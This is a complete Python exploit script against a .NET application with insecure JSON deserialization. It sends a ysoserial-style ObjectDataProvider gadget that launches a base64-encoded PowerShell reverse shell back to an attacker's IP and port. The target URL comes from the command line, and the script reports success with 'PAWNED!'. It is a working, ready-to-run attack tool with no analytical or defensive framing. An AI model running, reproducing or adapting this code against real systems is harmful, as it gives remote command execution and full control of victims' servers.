#/usr/bin/python3

import base64
from types import NoneType
import requests
import argparse

def banner():
    banner = '''
        ████████╗██████╗ ██╗███████╗ ██████╗ ███╗   ██╗███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
        ╚══██╔══╝██╔══██╗██║██╔════╝██╔═████╗████╗  ██║██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
           ██║   ██████╔╝██║███████╗██║██╔██║██╔██╗ ██║███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
           ██║   ██╔══██╗██║╚════██║████╔╝██║██║╚██╗██║╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  
           ██║   ██║  ██║██║███████║╚██████╔╝██║ ╚████║███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   
           ╚═╝   ╚═╝  ╚═╝╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   
                                                                                                             
    '''
    return(print(banner))

def create_shell():
    #shell decoded
    command = '''$TCPClient = New-Object Net.Sockets.TCPClient(\''''+ip+'''\', '''+port+''');$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'PS ' + (pwd).Path + '> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()'''

    #shell encoding
    encode = base64.b64encode(command.encode("UTF-16LE"))
    shell = ("powershell.exe -exec bypass -enc " + str(encode, "UTF-8"))
    return shell

def exploit(help_message):
    try:
        #payload json by ysoserial
        objeto = {
            '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
            'MethodName':'Start',
            'MethodParameters':{
                '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
                '$values':['cmd', '/c ' + str(create_shell())]
            },
            'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
        }

        #Header
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
        }

        #request to exploit
        r = requests.post(url=url, json=objeto, headers=headers)

        #request to exploit using burp suite proxy
        #proxies = {"http": "http://127.0.0.1:8080", "http": "http://127.0.0.1:8080"}
        #r = requests.post(url=url, json=objeto, headers=headers, proxies=proxies)
        
        return(print("😈 PAWNED!😈"))
    except:
        help_message()
        exit(1)

if __name__ == "__main__":

    banner()

    parser = argparse.ArgumentParser(description="")
    parser.add_argument("-u","--url", type=str, help="Enter the target", required=True)
    parser.add_argument("-i","--ip", type=str, help="Enter your ip", required=True)
    parser.add_argument("-p","--port", type=str, help="Enter your port", required=True)
    args = parser.parse_args()
    url,ip,port = args.url, args.ip, args.port

    exploit(parser.print_help)
